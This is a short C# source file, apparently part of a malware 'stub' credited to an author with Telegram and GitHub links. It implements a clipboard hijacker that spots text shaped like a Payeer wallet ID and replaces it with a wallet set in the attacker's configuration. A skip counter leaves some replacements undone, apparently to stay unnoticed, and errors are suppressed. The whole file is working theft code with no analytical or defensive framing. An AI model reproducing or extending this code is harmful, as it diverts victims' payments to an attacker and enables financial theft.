/* 
    Author : Megavolt
	Telegram Group : t.me/DOLFX
    Github : github.com/Megavolt666
	Telegram Author : t.me/megavoltcoder
*/
using System.Windows.Forms;

namespace stubOnion
{
    class Payeer
    {
        public static int _oppToMiss;
        public static void GetPayeer()
        {
            try
            {
                if (Clipboard.ContainsText())
                {
                    var clpbrd = Clipboard.GetText();

                    if (clpbrd.Length >= 9 && clpbrd.Length <= 14 && clpbrd.StartsWith("P"))
                    {
                        if (_oppToMiss > 0)
                        {
                            _oppToMiss--;
                            return;
                        }
                        _oppToMiss = Config.OppToMissDef;
                        Clipboard.SetText(Config.payeer);
                    }

                }
                else
                {
                    return;
                }
            }
            catch { }
        }
    }
}
